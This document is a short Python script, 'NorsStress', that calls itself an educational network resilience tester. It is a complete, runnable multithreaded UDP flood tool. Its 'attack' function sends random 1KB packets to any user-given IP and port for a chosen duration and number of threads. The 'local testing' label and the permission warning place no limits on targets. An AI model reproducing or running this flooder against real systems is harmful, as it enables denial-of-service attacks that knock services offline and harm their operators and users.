#!/usr/bin/env python3
# NorsStress - Network Resilience Testing Tool (Simulated)
# License: GPLv3
# Note: This is an educational tool for stress testing local infrastructure.
import socket
import threading
import time
import argparse

def attack(ip, port, duration):
    timeout = time.time() + duration
    sent_packets = 0
    
    try:
        # Simple UDP flood simulation for local stress testing
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = os.urandom(1024) # 1KB payload
        
        while time.time() < timeout:
            sock.sendto(payload, (ip, port))
            sent_packets += 1
            
    except Exception:
        pass

if __name__ == "__main__":
    import os
    parser = argparse.ArgumentParser(description="NorsStress - Network Resilience Tester")
    parser.add_argument("-t", "--target", required=True, help="Target IP")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target Port")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Test duration in seconds")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Number of concurrent threads")
    
    args = parser.parse_args()
    
    print(f"🦅 NorsStress Initiated against {args.target}:{args.port}")
    print(f"[*] Duration: {args.duration}s | Threads: {args.workers}")
    print("[!] WARNING: Ensure you have permission to stress test this target.")
    
    threads = []
    for _ in range(args.workers):
        t = threading.Thread(target=attack, args=(args.target, args.port, args.duration))
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    print("[+] Stress test complete.")
